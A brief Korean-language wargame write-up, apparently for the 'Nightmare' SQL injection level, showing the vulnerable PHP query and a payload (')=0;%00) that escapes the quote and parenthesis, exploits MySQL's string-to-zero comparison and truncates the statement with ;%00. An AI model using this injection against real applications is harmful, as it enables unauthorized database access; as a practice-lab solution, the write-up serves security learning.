# Nightmare

소스코드는 다음과 같다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

`pw`를 `(' ')`의 형태로 감싸주고 있어, 두개 다 이스케이프를 해야한다. 오히려 이를 이용하여 `;`를 이용해 값을 `True`로 만들어 줄 것이다.

`mysql`에서 자동 형 변환 규칙이 있는데, 그 중 하나는

> 문자열은 숫자 0과 같다. 라는 것이다.

이를 이용하여 `''=0`을 넣어주고 문장을 종결시킬 예정이다.

> ?pw='\)=0;%00

처음에 `;` 이용법을 잘 몰라서 헤맸지만, `;`는 `%00`과 같이다녀서 `;%00`으로 쓰니까 잘 작동하였다.

Clear!

